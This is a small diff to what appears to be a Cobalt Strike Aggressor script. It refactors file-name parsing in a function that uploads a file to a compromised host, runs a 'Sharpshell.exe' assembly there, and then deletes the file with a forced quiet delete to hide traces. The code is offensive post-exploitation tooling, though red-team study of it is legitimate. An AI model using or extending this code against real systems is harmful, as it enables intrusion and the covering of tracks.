@@ -1,10 +1,9 @@
 #define functions
 
 sub Exec_sharpshell{
-    local('$fpath $last $fname');
+    local('$fpath $fname');
     $fpath = $3['file'];
-    $last = lindexOf($fpath, "\\");
-    $fname = substr($fpath,$last + 1,);
+    $fname = getFileName(replace($fpath, '\\\\', "/"));
     bupload($bid, $fpath);
     bexecute_assembly($bid, script_resource("post/Sharpshell.exe"), "\"".$fname."\"");
     bshell($bid,"del /F /S /Q $fname");
